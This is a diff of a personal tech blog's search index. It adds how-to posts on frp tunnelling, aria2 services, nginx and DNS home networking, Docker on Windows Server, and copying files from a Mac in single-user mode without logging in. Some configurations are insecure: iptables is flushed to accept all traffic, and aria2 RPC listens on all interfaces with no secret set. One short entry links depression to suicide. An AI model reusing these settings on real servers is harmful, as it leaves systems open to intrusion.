@@ -699,6 +699,403 @@ LR的前几集中，确实有令人惊艳的枪战戏。制作公司在做枪战
       </tags>
   </entry>
   <entry>
+    <title>利用frp进行内网穿透，从外网访问内部服务器 (使用Oracle VM)</title>
+    <url>/articles/devops/intranet-penetration-with-frp-and-oracle-vms/</url>
+    <content><![CDATA[前言 &amp; 简要介绍我为什么突然要搞一个内网穿透呢，因为oracle有一个免费的机器，放着也没用，不如整一个frp做内网穿透好了。
+什么是内网穿透，简单来说就是你家里有一个服务器，开放了一些服务想要给外面的人用。但是你没有公网ip，所以外面访问不了。
+这个时候，就需要内网穿透。通过一个有公网地址的服务器，把流量转发过来。
+接下来就是我如何配置内网穿透的过程了。
+
+
+我的配置首先你得有一个具有公网ip的服务器，一个域名(如果你没有http的流量需要转发的话就不需要)。公网的服务器用来安装frp的服务器端，一个域名用来对不同的web服务进行转发。
+frp的代码开源在githubfrp，文档在文档。最基本的安装教程以及配置都可以在这两个链接中找到。
+服务器设置（服务端）安装&amp;配置 frps首先在Github的Release页面中下载对应操作系统架构的可执行文件，然后解压
+wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.44.0&#x2F;frp_0.44.0_linux_amd64.tar.gz
+
+tar -zxvf frp_0.44.0_linux_amd64.tar.gz
+
+打开fprs.ini，记住是fprs.ini
+修改内容为
+[common]
+bind_port &#x3D; 7000 # 这个是服务器的端口
+token&#x3D;your_token # 改成你自己的token，随便取
+
+dashboard_port &#x3D; 7500 # 这个是管理界面的端口
+dashboard_user &#x3D; aynakeya # 这个是管理界面的账号
+dashboard_pwd &#x3D; your_password # 这个是管理界面的密码
+enable_prometheus &#x3D; true # 这个是开始管理界面
+
+subdomain_host &#x3D; aa.xxxx.com # 这个是http服务的自定义二级域名
+vhost_http_port &#x3D; 80 # 这个是http服务的端口，如果不需要转发http就不用写
+
+关于自定义二级域名的跟多信息可以看自定义二级域名
+将frps注册为系统服务并启动创建frps.service文件
+在/etc/systemd/system/frps.service中填上
+[Unit]
+# 服务名称，可自定义
+Description &#x3D; frp server
+After &#x3D; network.target syslog.target
+Wants &#x3D; network.target
+
+[Service]
+Type &#x3D; simple
+# 启动frps的命令，需修改为frps的安装路径
+ExecStart &#x3D; &#x2F;home&#x2F;ubuntu&#x2F;repo&#x2F;frp&#x2F;frps -c &#x2F;home&#x2F;ubuntu&#x2F;repo&#x2F;frp&#x2F;frps.ini
+
+[Install]
+WantedBy &#x3D; multi-user.target
+
+然后启动并查看服务状态
+sudo systemctl start frps.service
+sudo systemctl status frps.service
+
+打开允许程序通过服务器防火墙这里以Oracle VM作为例子
+打开Oracle VM Ubuntu系统instance的防火墙 reference
+sudo iptables -P INPUT ACCEPT
+sudo iptables -P OUTPUT ACCEPT
+sudo iptables -P FORWARD ACCEPT
+sudo iptables -F
+
+找到Instance -&gt; subnet -&gt; security list -&gt; 选一个security list
+在security list中添加规则 Ingress Rule，把管理端口，程序端口，以及你要映射的端口都加上
+
+客户端设置 frpc安装&amp;配置 frpc同样在Github的Release页面中下载对应操作系统架构的可执行文件，然后解压
+wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.44.0&#x2F;frp_0.44.0_linux_amd64.tar.gz
+
+tar -zxvf frp_0.44.0_linux_amd64.tar.gz
+
+打开fprc.ini，这次是fprc.ini
+填入如下内容，更多功能可以参考frp功能
+[common]
+server_addr &#x3D;  x.x.x.x # 服务器的地址
+server_port &#x3D; 7000
+token&#x3D;your_token  # 在服务器设置里填的token
+
+[frontpage]
+type &#x3D; http 
+local_ip &#x3D; 127.0.0.1 # 本地的地址
+local_port &#x3D; 80 # 本地的端口
+custom_domains &#x3D; aa.xxxx.com # 用aa.xxxx.com访问
+
+[calibre]
+type &#x3D; http
+local_ip &#x3D; 127.0.0.1
+local_port &#x3D; 8020
+# 用calibre.&lt;subdomain_host&gt; 也就是 用calibre.aa.xxxx.com
+subdomain &#x3D; calibre 
+
+[jellyfin]
+type &#x3D; http
+local_ip &#x3D; 127.0.0.1
+local_port &#x3D; 8030
+subdomain &#x3D; jellyfin
+
+[aria2web]
+type &#x3D; http
+local_ip &#x3D; 127.0.0.1
+local_port &#x3D; 6801
+subdomain &#x3D; aria2web
+
+将frpc注册为系统服务并启动创建frpc.service文件
+在/etc/systemd/user/frps.service中填上
+[Unit]
+Description &#x3D; frp client
+After &#x3D; network.target syslog.target
+Wants &#x3D; network.target
+
+[Service]
+Type &#x3D; simple
+ExecStart &#x3D; &#x2F;home&#x2F;aynakeya&#x2F;repo&#x2F;frp&#x2F;frpc -c &#x2F;home&#x2F;aynakeya&#x2F;repo&#x2F;frp&#x2F;frpc.ini
+
+[Install]
+WantedBy &#x3D; multi-user.target
+
+启动并检查
+systemctl --user start frpc.service
+systemctl --user status frpc.service
+
+域名设置打开dns记录，添加上两个记录，一个是次级域名的解析，一个是次级域名的次级域名的解析.
+比如在这里就是aa.xxxx.com和*.aa.xxxx.com
+
+完成然后你就可以从外网访问你的内部服务器啦
+效果展示这个就不放了，效果和内网访问一样的。
+]]></content>
+      <categories>
+        <category>DevOps</category>
+      </categories>
+      <tags>
+        <tag>内网穿透</tag>
+        <tag>frp</tag>
+        <tag>reverse proxy</tag>
+        <tag>oracle</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>打开user lingering来运行服务 + 在linux上建立aria2c服务</title>
+    <url>/articles/devops/enable-linux-user-lingering-for-service/</url>
+    <content><![CDATA[概括最近在搞自己的小主机，在配置自己的aria2c服务的时候，发现aria2的服务时不时就会断掉,并报错Emergency shutdown sequence commencing。
+本文介绍了如何修复这个问题，以及我的aria2服务配置
+
+
+问题因为想要aria2c以非root用户运行，我用 systemctl --user start aria2.service，这个时候服务正常启动，也不会结束。
+但是，一旦我退出这个ssh session，过几秒之后aria2c就会自动停止。
+重复几次试验后，确认了退出ssh session后，aria2c服务就会停止。
+下面是报错的日志
+2022-04-24 12:55:45.578362 [NOTICE] [HttpListenCommand.cc:108] IPv4 RPC: listening on TCP port 6800
+2022-04-24 12:55:45.578468 [NOTICE] [HttpListenCommand.cc:108] IPv6 RPC: listening on TCP port 6800
+2022-04-24 12:55:57.533186 [NOTICE] [DownloadEngine.cc:265] Emergency shutdown sequence commencing...
+
+原因&amp;解决方法在进行了一定时间的互联网冲浪后，我在stackexchange上找到了解决方法: 链接.
+原因是运行这个service的用户没有user lingering。
+根据 loginctl 的 man page所说
+
+Enable&#x2F;disable user lingering for one or more users. If enabled for a specific user, a user manager is spawned for the user at boot and kept around after logouts. This allows users who are not logged in to run long-running services. 
+
+简单来说，如果一个用户没有开启user lingering，他开启的service在这个用户登出之后就会自行结束。
+所以，解决方法就是为运行这个service的用户开启user lingering
+我们可以用这个命令来打开
+sudo loginctl enable-linger aynakeya # enable user linger for aynakeya
+
+开启完毕后我们再次启动service，然后登出ssh session。发现这个时候aria2已经不会自动退出了。
+Aria2 As Service顺便贴一下aria2作为系统服务的配置。
+安装好aria2后，把这个文件aria2.service 放到 /etc/systemd/user/目录下即可。
+启动aria2的方式为:  systemctl --user start aria2.service关闭为: systemctl --user stop aria2.service
+[Unit]
+Description&#x3D;Aria2c As Service
+
+[Service]
+Type&#x3D;forking
+ExecStart&#x3D;&#x2F;usr&#x2F;bin&#x2F;aria2c -D --conf-path&#x3D;&#x2F;home&#x2F;aynakeya&#x2F;repo&#x2F;aria2&#x2F;aria2-daemon.conf
+WorkingDirectory&#x3D;&#x2F;home&#x2F;aynakeya&#x2F;repo&#x2F;aria2
+
+[Install]
+WantedBy&#x3D;default.target
+
+aria2-daemon.conf的内容如下
+# server config
+continue&#x3D;true
+# run as service
+daemon&#x3D;true
+#设置加密的密钥
+#rpc-secret&#x3D;aaabbbccc
+#允许rpc
+enable-rpc&#x3D;true
+#允许所有来源, web界面跨域权限需要
+rpc-allow-origin-all&#x3D;true
+#允许外部访问，false的话只监听本地端口
+rpc-listen-all&#x3D;true
+#RPC端口, 仅当默认端口被占用时修改
+#rpc-listen-port&#x3D;6800
+
+
+# logging config
+log&#x3D;&#x2F;home&#x2F;aynakeya&#x2F;repo&#x2F;aria2&#x2F;log&#x2F;aria2.log
+log-level&#x3D;notice
+
+# download config
+
+#最大同时下载数(任务数), 路由建议值: 3
+max-concurrent-downloads&#x3D;5
+#断点续传
+continue&#x3D;true
+#同服务器连接数
+max-connection-per-server&#x3D;5
+#最小文件分片大小, 下载线程数上限取决于能分出多少片, 对于小文件重要
+min-split-size&#x3D;10M
+#单文件最大线程数, 路由建议值: 5
+split&#x3D;10
+#下载速度限制
+max-overall-download-limit&#x3D;0
+#单文件速度限制
+max-download-limit&#x3D;0
+#上传速度限制
+max-overall-upload-limit&#x3D;0
+#单文件速度限制
+max-upload-limit&#x3D;0
+#断开速度过慢的连接
+#lowest-speed-limit&#x3D;0
+#验证用，需要1.16.1之后的release版本
+#referer&#x3D;*
+#文件保存路径, 默认为当前启动位置
+dir&#x3D;&#x2F;home&#x2F;aynakeya&#x2F;Downloads
+#文件缓存, 使用内置的文件缓存, 如果你不相信Linux内核文件缓存和磁盘内置缓存时使用, 需要1.16及以上版本
+#disk-cache&#x3D;0]]></content>
+      <categories>
+        <category>DevOps</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>lingering</tag>
+        <tag>aria2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Resolving System Crash Issue After Installing Kubuntu on ThinkBook 16+</title>
+    <url>/articles/devops/resolving-system-crash-on-kubuntu-with-thinkbook-16/</url>
+    <content><![CDATA[Introby ChatGPT
+During my recent work, I attempted to install the Kubuntu operating system on a ThinkBook 16+. However, I encountered an intriguing issue. After successful installation, I began to experience unpredictable system crashes followed by a reboot. In this blog, I will share my troubleshooting and resolution process, hoping to help readers who encounter similar issues.
+
+
+Observation and DiagnosisBefore beginning my investigation, I first observed the manifestation of these crashes. I noticed that the system would crash only after establishing a network connection, which led me to suspect an issue with the network driver. Upon checking the hardware specifications of the device, I found that the network adapter is an mt7921e.
+To further probe the potential issues within the system, I ran the command sudo journalctl | grep mt2971e in the terminal, seeking relevant error messages from the system logs. From the returned logs, I noticed the following entries:
+May 18 16:37:52 kernel: mt7921e 0000:03:00.0: Timeout for driver own
+May 18 16:37:52 kernel: mt7921e 0000:03:00.0: driver own failed
+
+Searching for a SolutionArmed with this information, I began looking for possible solutions online. On GitHub, I came across an issue similar to my problem: https://github.com/openwrt/mt76/issues/681. From this issue, I learned that the problem could potentially be related to the version of the Linux kernel.
+Therefore, I attempted to update to the 6.1 generic version of the kernel, but the issue persisted—the system continued to crash.
+The Final SolutionDespite the fact that updating to the latest generic kernel did not solve the issue, I did not give up. After conducting further research, I decided to try installing the 6.1 version of the ubuntu OEM kernel.
+Following the instructions provided in the official Ubuntu documentation at https://wiki.ubuntu.com/Kernel/OEMKernel, I installed the OEM kernel. 
+apt install linux-oem-22.04c
+
+The result was success—the system no longer experienced crashes or reboots!
+ConclusionThrough the process of resolving this issue, I gained a deeper understanding of the Linux kernel and network drivers. I also learned how to pinpoint and resolve issues through system logs and online resources. By sharing this experience, I hope to assist others experiencing similar issues on their Linux systems.
+]]></content>
+      <categories>
+        <category>DevOps</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>kernel</tag>
+        <tag>kubuntu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ubuntu22.04 SSH的RSA私钥不能用了</title>
+    <url>/articles/devops/ubuntu-ssh-rsa-key-is-not-working-since-upgrade-to-22-04/</url>
+    <content><![CDATA[Ubuntu从20.04升级到22.02之后ssh的私钥不能用了，出现permission denied.
+查了一下是因为Ubuntu22.04默认不再支持SHA1了。所以就不能用了。
+解决方法也很简单，生成一个新的密钥对即可
+ssh-keygen -t ed25519 -C &quot;youname@computer-name&quot;
+ssh-copy-id youname@xxx.xxx.xxx.xxx
+
+参考答案
+]]></content>
+      <categories>
+        <category>DevOps</category>
+      </categories>
+      <tags>
+        <tag>ubuntu</tag>
+        <tag>ssh</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>My Internal Network Setup and Configuration</title>
+    <url>/articles/devops/setup-my-internal-network/</url>
+    <content><![CDATA[PrologueFor example, I have following services running in my local network.
+
+Git Server: Located at 192.168.1.100:80
+Jellyfin Server: Located at 192.168.1.101:8000
+NAS (Network Attached Storage): Located at 192.168.1.101:8010
+
+Is there any good way to access them without typing ip address?
+Yes. In this blog post, I&#39;ll walk you through how I set up my internal network. 
+
+
+Setting Up a Private DNS ServerThe first step in our journey is to set up a private DNS server within our local network. For this, I chose AdGuardHome, which I deployed at 192.168.1.102.
+With AdGuardHome, I was able to set up custom DNS resolutions. For instance:
+
+server1.cuora resolves to 192.168.1.101
+server2.cuora resolves to 192.168.1.100
+
+However, if a service operates on a different port, we need to employ a reverse proxy, like nginx, to handle the traffic.
+Setting Up a Reverse ProxyI set up a proxy server at 192.168.1.103. This means that any requests to *.internal.cuora are directed to the proxy server at 192.168.1.103.
+
+Nginx ConfigurationHere&#39;s a brief overview of my nginx setup:
+
+For jellyfin.internal.cuora, traffic is directed to 192.168.1.101:8000
+For git.internal.cuora, traffic is directed to 192.168.1.100:80
+For nas.internal.cuora, traffic is directed to 192.168.1.101:8010
+
+With this configuration, I can easily access all my internal services using domain names, making the entire process seamless and user-friendly.
+Example Config
+server &#123;
+    listen 80;
+    
+    server_name jellyfin.internal.cuora;
+
+    location / &#123;
+        proxy_pass http://192.168.0.180:8030/;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-Host $host;
+        proxy_set_header X-Forwarded-Port $server_port;
+    &#125;
+&#125;
+
+don&#39;t forget to add a default nginx config
+server &#123;    
+   listen 80 default; 
+   server_name _; 
+ 
+   root /usr/share/nginx/html;
+ 
+   index index.html index.htm;
+ 
+   location / &#123; 
+     try_files $uri $uri/ =404;
+   &#125; 
+&#125;
+
+Settup RouterThis part is quite easy. In DHCP setting, just set default DNS server to our own private dns server 192.168.1.102.
+
+Network Structure
+Done!
+]]></content>
+      <categories>
+        <category>DevOps</category>
+      </categories>
+      <tags>
+        <tag>network</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>在windows server 2016上安装Docker + Docker Compose</title>
+    <url>/articles/devops/windows-server-2016-setup-docker/</url>
+    <content><![CDATA[如何在windows server 2016上安装Docker + Docker Compose
+Quick Start简单来说，按照Microsoft官网上的来做就行了。但是，不用加-Repository PSGallery -Force, 加了就报错
+
+
+安装Docker
+Install-Module -Name DockerMsftProvider
+
+[System.Net.ServicePointManager]::SecurityProtocol &#x3D; [System.Net.SecurityProtocolType]::Tls12;
+
+Install-Package -Name docker -ProviderName DockerMsftProvider
+
+Restart-Computer -Force
+
+
+
+安装Docker-Compose
+[Net.ServicePointManager]::SecurityProtocol &#x3D; [Net.SecurityProtocolType]::Tls12
+
+ Invoke-WebRequest &quot;https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;v2.10.2&#x2F;docker-compose-Windows-x86_64.exe&quot; -UseBasicParsing -OutFile $Env:ProgramFiles\Docker\docker-compose.exe
+
+坑出现各种奇怪的问题首先更新windows server
+在Install-Module -Name DockerMsftProvider出现问题别加-Repository PSGallery -Force
+Reference
+https://docs.microsoft.com/zh-cn/virtualization/windowscontainers/quick-start/set-up-environment?tabs=Windows-Server
+https://docs.docker.com/compose/install/compose-plugin/#install-compose-on-windows-server
+
+]]></content>
+      <categories>
+        <category>DevOps</category>
+      </categories>
+      <tags>
+        <tag>Windows Server</tag>
+        <tag>docker</tag>
+        <tag>installation</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ceshi</title>
+    <url>/articles/blogarchive/2018-09-19-11-06-38/</url>
+    <content><![CDATA[ceshi
+]]></content>
+      <categories>
+        <category>保护</category>
+      </categories>
+  </entry>
+  <entry>
     <title>hello</title>
     <url>/articles/blogarchive/2018-09-29-01-59-09/</url>
     <content><![CDATA[#HelloWorldHelloWorld
@@ -710,15 +1107,6 @@ hello
 ]]></content>
       <categories>
         <category>系统默认</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>ceshi</title>
-    <url>/articles/blogarchive/2018-09-19-11-06-38/</url>
-    <content><![CDATA[ceshi
-]]></content>
-      <categories>
-        <category>保护</category>
       </categories>
   </entry>
   <entry>
@@ -760,21 +1148,21 @@ https://i.loli.net/2018/09/29/5baf62c4b9f9d.jpeg
       </categories>
   </entry>
   <entry>
-    <title>1122</title>
-    <url>/articles/blogarchive/2018-11-22-14-11-04/</url>
-    <content><![CDATA[无聊&#x3D;自闭自闭&#x3D;抑郁抑郁&#x3D;自杀
-]]></content>
-      <categories>
-        <category>Life</category>
-      </categories>
-  </entry>
-  <entry>
     <title>新功能上线，文件分享</title>
     <url>/articles/blogarchive/2018-11-27-20-57-44/</url>
     <content><![CDATA[最新功能，文件分享。做的时候感觉有一堆用处，结果写完之后发现没啥屁用处。测试地址：https://lxgshadow.us/files/detail?id=1
 ]]></content>
       <categories>
         <category>SiteDev</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>1122</title>
+    <url>/articles/blogarchive/2018-11-22-14-11-04/</url>
+    <content><![CDATA[无聊&#x3D;自闭自闭&#x3D;抑郁抑郁&#x3D;自杀
+]]></content>
+      <categories>
+        <category>Life</category>
       </categories>
   </entry>
   <entry>
@@ -893,58 +1281,6 @@ def generateFilehash(filepath, blocksize=2 ** 16):
       </tags>
   </entry>
   <entry>
-    <title>Shazam听歌识曲算法解析+python实现-3 检索歌曲</title>
-    <url>/articles/blogarchive/2019-02-09-20-39-15/</url>
-    <content><![CDATA[第三部份在开始之前，我们首先要认真阅读一下论文《An Industrial-Strength Audio Search Algorithm》。 
-paper下载链接：https://www.ee.columbia.edu/~dpwe/papers/Wang03-shazam.pdf中文翻译：https://blog.csdn.net/yutianzuijin/article/details/49787551建议读英文的鸭。
-为获得良好的阅读体验，你可能先需要了解 mysql数据库的基础知识，python基础语法，一定的代码阅读能力，一定的语文理解能力(up写的很乱)。
-好的，那么今天我们进入最后一部分，搜索与匹配。
-Up在这里使用了orm框架SQLalchemy
-首先，我们要建立起一个数据库来储存上一步中获取的指纹信息。
-其中一个表来储存歌曲信息，一个表来储存歌曲信息对应的指纹，两个表用歌曲的id作为外键相连。
-
-注意，fingerprint 这个column 必须要加上index，这将会大大减少查询速度，千真万确。
-songs 表为歌曲信息表：
-id 用来储存歌曲id，
-name用来存储歌曲名字
-filehash用来储存该歌曲文件的哈希
-fingerprinted用来判断该歌曲是否已经进行了fingerprint
-
-Fingerprints 表为储存指纹的表：
-id为指纹id，没什么用
-song_id 是外键，记录对应的歌曲信息
-fingerprint就是获取到的指纹信息
-offset就是该指纹的offset位置
-建完这个表，然后你就可以把指纹信息全都放进去了。
-然后，我们来讲讲搜索与识别的基本原理：
-1.首先输入一段声音，然后和之间一样，获取这一段声音的指纹。
-2.对获取到的每一个指纹，在数据库中搜索相同的指纹，并将指纹对应的歌曲信息，以及offset偏移值保存。
-3.有相同offset差值越多的歌曲就是识别出的歌曲。
-tk’&#x3D;tk+offset,
-这样子说可能有点抽象，我们来举个栗子:
-假如在某个音频中，你提取到了1个指纹，这个指纹是 c19dde0ecb8fca81b6c98d5ee3775c26cbb32a610c82a5ecda515b0beb86d357， 且它在那段音频中的offset 是 30。
-通过这个指纹，你在数据库中取到了如下的数据
-
-然后我们可以计算得到 offset 差值分别为 70, 70 ,170, 20, 93, 160, 90, 70
-
-在这里，我们可以看到，offset差值是70 且 id 为 1 的有3 个，offset差值是170 且 id 为 1的有一个，offset差值是20 且 id 为 2 的有1 个，offset差值是933 且 id 为 3 的有一个……
-所以最多就是 有3个的那个值。也就是id为1的歌曲。
-有人会问，为什么不一首歌一首歌的检索呢，因为慢。
-接下来代码。获取所有匹配的指纹，并将歌曲信息与offset差值保存下来。
-
-对数据进行处理，得出相同offset差值最多的歌曲，也就是识别出来的歌曲。
-
-结束。
-转载请先获得许可
-]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-      <tags>
-        <tag>shazam</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>shazam听歌识曲算法解析+python实现-2 生成指纹</title>
     <url>/articles/blogarchive/2019-02-09-17-01-47/</url>
     <content><![CDATA[第二部份在开始之前，我们首先要认真阅读一下论文《An Industrial-Strength Audio Search Algorithm》，最好是一个字一个字，一个图一个图的把paper看下来（然后你就不需要来看这篇文章了，笑）
@@ -1018,6 +1354,58 @@ time_constraint_condition 是一个 元组，包含可以作为指纹的两个�
 [2]: https://github.com/worldveil/dejavu
 [3]: https://blog.csdn.net/yutianzuijin/article/details/49787551
 [4]: Wang, Avery. &quot;An Industrial Strength Audio Search Algorithm.&quot; Ismir. Vol. 2003. 2003.
+]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+      <tags>
+        <tag>shazam</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Shazam听歌识曲算法解析+python实现-3 检索歌曲</title>
+    <url>/articles/blogarchive/2019-02-09-20-39-15/</url>
+    <content><![CDATA[第三部份在开始之前，我们首先要认真阅读一下论文《An Industrial-Strength Audio Search Algorithm》。 
+paper下载链接：https://www.ee.columbia.edu/~dpwe/papers/Wang03-shazam.pdf中文翻译：https://blog.csdn.net/yutianzuijin/article/details/49787551建议读英文的鸭。
+为获得良好的阅读体验，你可能先需要了解 mysql数据库的基础知识，python基础语法，一定的代码阅读能力，一定的语文理解能力(up写的很乱)。
+好的，那么今天我们进入最后一部分，搜索与匹配。
+Up在这里使用了orm框架SQLalchemy
+首先，我们要建立起一个数据库来储存上一步中获取的指纹信息。
+其中一个表来储存歌曲信息，一个表来储存歌曲信息对应的指纹，两个表用歌曲的id作为外键相连。
+
+注意，fingerprint 这个column 必须要加上index，这将会大大减少查询速度，千真万确。
+songs 表为歌曲信息表：
+id 用来储存歌曲id，
+name用来存储歌曲名字
+filehash用来储存该歌曲文件的哈希
+fingerprinted用来判断该歌曲是否已经进行了fingerprint
+
+Fingerprints 表为储存指纹的表：
+id为指纹id，没什么用
+song_id 是外键，记录对应的歌曲信息
+fingerprint就是获取到的指纹信息
+offset就是该指纹的offset位置
+建完这个表，然后你就可以把指纹信息全都放进去了。
+然后，我们来讲讲搜索与识别的基本原理：
+1.首先输入一段声音，然后和之间一样，获取这一段声音的指纹。
+2.对获取到的每一个指纹，在数据库中搜索相同的指纹，并将指纹对应的歌曲信息，以及offset偏移值保存。
+3.有相同offset差值越多的歌曲就是识别出的歌曲。
+tk’&#x3D;tk+offset,
+这样子说可能有点抽象，我们来举个栗子:
+假如在某个音频中，你提取到了1个指纹，这个指纹是 c19dde0ecb8fca81b6c98d5ee3775c26cbb32a610c82a5ecda515b0beb86d357， 且它在那段音频中的offset 是 30。
+通过这个指纹，你在数据库中取到了如下的数据
+
+然后我们可以计算得到 offset 差值分别为 70, 70 ,170, 20, 93, 160, 90, 70
+
+在这里，我们可以看到，offset差值是70 且 id 为 1 的有3 个，offset差值是170 且 id 为 1的有一个，offset差值是20 且 id 为 2 的有1 个，offset差值是933 且 id 为 3 的有一个……
+所以最多就是 有3个的那个值。也就是id为1的歌曲。
+有人会问，为什么不一首歌一首歌的检索呢，因为慢。
+接下来代码。获取所有匹配的指纹，并将歌曲信息与offset差值保存下来。
+
+对数据进行处理，得出相同offset差值最多的歌曲，也就是识别出来的歌曲。
+
+结束。
+转载请先获得许可
 ]]></content>
       <categories>
         <category>Programming</category>
@@ -1152,6 +1540,53 @@ Just not use add when inserting large amount of data.
       </tags>
   </entry>
   <entry>
+    <title>Fix memory error caused by memory overflowing</title>
+    <url>/articles/blogarchive/2019-04-06-17-38-45/</url>
+    <content><![CDATA[When I was adding all my song to the data base yesterday, I always found memory error after several song was processed.
+
+after checking the task manager, i found i got memory overflow when processing the song.
+After doing some research, i come up with a solution.
+By using del and gc.collect() after finish using a varible that takes lots of memory, the problem is successfully solved.
+
+
+]]></content>
+      <categories>
+        <category>系统默认</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Problem about install windows 10 in mac os with bootcamp.</title>
+    <url>/articles/blogarchive/2019-04-17-16-43-23/</url>
+    <content><![CDATA[problem 1: stuck at &quot;partition disk&quot;.
+solution: 
+
+force quit boot camp
+
+then open disk utility.
+
+click partition, delete all other partition (using the - symbol)that bootcamp made. including: OSXRECOVER and BOOTCAMP.
+
+open bootcamp again and try re-install again.
+
+
+
+problem 2: An error occurred while copying the Windows installation files
+reason:  because bootcamp using a 8g FAT32 disk partition to copy windows file, since FAT32 can not support file larger than 4g. any windows file larger than 4g will cause this problem happen.
+solution: 
+
+use a ISO that have file size smaller than 4g.
+known iso that can not use: 1703 1803 1809 (may work on your computer)
+known iso that can use: none
+
+]]></content>
+      <categories>
+        <category>系统默认</category>
+      </categories>
+      <tags>
+        <tag>macos</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>use table partition to increase inserting performance</title>
     <url>/articles/blogarchive/2019-04-06-18-00-02/</url>
     <content><![CDATA[when the number of data excess 5 million. mysql database will face a significant drop down in inserting speed. 
@@ -1210,53 +1645,6 @@ alter table fingerprints drop partition p20
       </tags>
   </entry>
   <entry>
-    <title>Fix memory error caused by memory overflowing</title>
-    <url>/articles/blogarchive/2019-04-06-17-38-45/</url>
-    <content><![CDATA[When I was adding all my song to the data base yesterday, I always found memory error after several song was processed.
-
-after checking the task manager, i found i got memory overflow when processing the song.
-After doing some research, i come up with a solution.
-By using del and gc.collect() after finish using a varible that takes lots of memory, the problem is successfully solved.
-
-
-]]></content>
-      <categories>
-        <category>系统默认</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Problem about install windows 10 in mac os with bootcamp.</title>
-    <url>/articles/blogarchive/2019-04-17-16-43-23/</url>
-    <content><![CDATA[problem 1: stuck at &quot;partition disk&quot;.
-solution: 
-
-force quit boot camp
-
-then open disk utility.
-
-click partition, delete all other partition (using the - symbol)that bootcamp made. including: OSXRECOVER and BOOTCAMP.
-
-open bootcamp again and try re-install again.
-
-
-
-problem 2: An error occurred while copying the Windows installation files
-reason:  because bootcamp using a 8g FAT32 disk partition to copy windows file, since FAT32 can not support file larger than 4g. any windows file larger than 4g will cause this problem happen.
-solution: 
-
-use a ISO that have file size smaller than 4g.
-known iso that can not use: 1703 1803 1809 (may work on your computer)
-known iso that can use: none
-
-]]></content>
-      <categories>
-        <category>系统默认</category>
-      </categories>
-      <tags>
-        <tag>macos</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Add tag system</title>
     <url>/articles/blogarchive/2019-05-20-10-08-26/</url>
     <content><![CDATA[In May 20, 2019. I add a tag system into the blog.
@@ -1268,6 +1656,65 @@ click submit to finish.
       <categories>
         <category>SiteDev</category>
       </categories>
+  </entry>
+  <entry>
+    <title>Use single-user-mode to access files from a mac without login</title>
+    <url>/articles/blogarchive/2019-05-26-18-23-29/</url>
+    <content><![CDATA[On May 23, 2019. I accidentally drop my MacBook, which looses the connection between the motherboard and hard drive. After I reconnect the SATA cable and restart my computer, I found that my laptop stuck after I enter the login password.
+##First try:In recovery mode, reset the password.
+See instruction at:
+ https://www.macworld.co.uk/how-to/mac/forgotten-mac-password-3594395/ 
+or https://support.apple.com/en-hk/HT202860 
+or https://jingyan.baidu.com/article/6f2f55a163030bb5b83e6c71.html
+However, I failed.
+
+##Second try:I first try to set up a new user by using single user mode.
+See instruction here: https://zhidao.baidu.com/question/528962469.html
+However, after I set up the new user, I still got stuck when I try to login into the system.
+
+##My solutionSince I have a Time Machine backup in January, I can recover my computer using Time Machine. However, I still need to backup some important information that is not in the Time machine. After doing some research, I successfully copy the important file from MacBook using single user mode.
+###Copy file without login:
+If your mac running a macos higher than El Capitan, you should first remove “System Integrity Protection” before entering the single user mode. 
+
+Reboot your mac and press command + R, go to the recovery mode.
+
+Click on the &quot;Utilities&quot; menu, and then click on &quot;Terminal&quot; to open terminal.
+
+In the terminal type csrutil disable and enter.
+
+
+
+If your mac running a macos lower than El Capitain, ignore the step above.
+
+reboot again, but this time press command + S to enter single user mode.
+
+Follow the instruction, type /sbin/fsck -fy and press enter (if this command does not show “The volume xxx appears to be OK”, you should run this command multiple time until it shows this message)
+
+type mount -uw / and press enter
+
+type mkdir /Volumes/usb to create a directory for external storage device (using later). 
+
+type ls /dev/disk* to show current disks.
+
+plug in an external storage device (USB or other things), type ls /dev/disk* to find which is the external storage device (often the last one in the list).
+
+type fstyp /dev/disk1s3 (depends on which disk you are using) to find the system of the disk, (Interest things is that although my drive is exfat, the fstyp shows msdos).
+
+according to 7, type /sbin/mount_exfat /dev/disk1s3 /Volumes/usb to load storage device. Depending on your file system, you may choose a different command. For example, if your device is using msdos file system, you should type /sbin/mount_msdos instead of /sbin/mount_exfat. You can see all the supported file system by entering ls /sbin/mount_*
+
+if the external storage is loaded success, you can now access your external drive. Type ls /Volumes/usb to find out.
+
+Copy file to your device by using command cp. Eg: cp /User/xxx/Desktop/1.jpg /Volumes/usb
+
+
+]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+      <tags>
+        <tag>macos</tag>
+        <tag>tutorial</tag>
+      </tags>
   </entry>
   <entry>
     <title>Landwave Word Test Cracking</title>
@@ -1330,8 +1777,8 @@ Restart the ss-server, you can now connect to your shadowsocks server successful
         <category>Developing</category>
       </categories>
       <tags>
-        <tag>shadowsocks</tag>
         <tag>tutorial</tag>
+        <tag>shadowsocks</tag>
         <tag>solution</tag>
       </tags>
   </entry>
@@ -1469,8 +1916,8 @@ file-allocation=prealloc
         <category>系统默认</category>
       </categories>
       <tags>
-        <tag>macos</tag>
         <tag>aria2</tag>
+        <tag>macos</tag>
       </tags>
   </entry>
   <entry>
